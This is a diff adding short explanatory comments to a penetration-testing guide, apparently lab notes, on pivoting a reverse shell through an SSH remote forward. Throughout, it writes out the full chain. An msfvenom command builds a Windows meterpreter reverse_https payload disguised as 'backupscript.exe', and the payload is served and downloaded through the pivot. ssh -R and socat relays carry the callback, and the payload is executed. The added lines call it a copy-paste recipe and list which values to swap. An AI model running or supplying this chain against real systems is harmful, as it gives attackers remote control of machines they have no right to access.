@@ -45,6 +45,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=172.16.5.129 LPORT=8080 \
     -f exe -o backupscript.exe
 ```
+> Builds a Windows reverse_https EXE whose `LHOST` is the pivot's internal IP; swap `LHOST`/`LPORT` and the output filename.
 
 > `LHOST` = the IP **the Windows target can reach** (the pivot's internal NIC `172.16.5.129`).
 > `LPORT` = the port we'll have the pivot **listen on** (we'll forward it to ourselves with `-R`).
@@ -70,6 +71,7 @@ scp backupscript.exe ubuntu@<PIVOT_EXT_IP>:~/
 # On the pivot, serve it on 8123 (or any free port)
 ubuntu@WEB01:~$ python3 -m http.server 8123
 ```
+> Copies the payload to the pivot then serves it over HTTP for the Windows target to fetch; swap `ubuntu@PIVOT`, filename, and port.
 
 ### 4. Pull the payload onto Windows A (RDP/SMB session from Section 3)
 
@@ -77,6 +79,7 @@ ubuntu@WEB01:~$ python3 -m http.server 8123
 PS C:\> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" `
                           -OutFile "C:\backupscript.exe"
 ```
+> Downloads the payload onto the Windows target from the pivot's HTTP server; swap the pivot IP/port, filename, and output path.
 
 ### 5. Set up the SSH **remote** forward from attacker → pivot
 
@@ -85,6 +88,7 @@ PS C:\> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" `
 # through the tunnel to our attack host's 0.0.0.0:8000 (where MSF is)
 ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PIVOT_EXT_IP> -vN
 ```
+> Reverse forward: pivot listens on `172.16.5.129:8080` and tunnels back to your handler on `8000`; swap the pivot bind IP/port, local port, and `ubuntu@PIVOT`.
 
 | Token | Meaning |
 |-------|---------|
@@ -110,12 +114,14 @@ ssh -R 8080:0.0.0.0:8000 ubuntu@<PIVOT_EXT_IP> -vN
 # On the pivot:
 ubuntu@WEB01:~$ socat TCP-LISTEN:8080,fork,reuseaddr,bind=172.16.5.129 TCP:127.0.0.1:8080
 ```
+> Fallback when `GatewayPorts` is off: bind `-R` to loopback then socat-expose it on the pivot's internal NIC; swap `ubuntu@PIVOT`, ports, and bind IP.
 
 ### 6. Execute the payload on Windows A
 
 ```powershell
 PS C:\> C:\backupscript.exe
 ```
+> Executes the dropped payload on the Windows target to trigger the callback; swap the executable path.
 
 SSH verbose log on the attacker side will print:
 
@@ -187,6 +193,7 @@ ssh -fNT -R PIVOT_INTERNAL_IP:8080:127.0.0.1:8000 user@PIVOT
 Invoke-WebRequest -Uri "http://PIVOT_INTERNAL_IP:8123/p.exe" -OutFile C:\p.exe
 C:\p.exe
 ```
+> Copy-paste reverse-forward recipe: payload, handler, `ssh -R`, then fetch/run on Windows; swap `PIVOT_INTERNAL_IP`, ports, `user@PIVOT`.
 
 ---
 
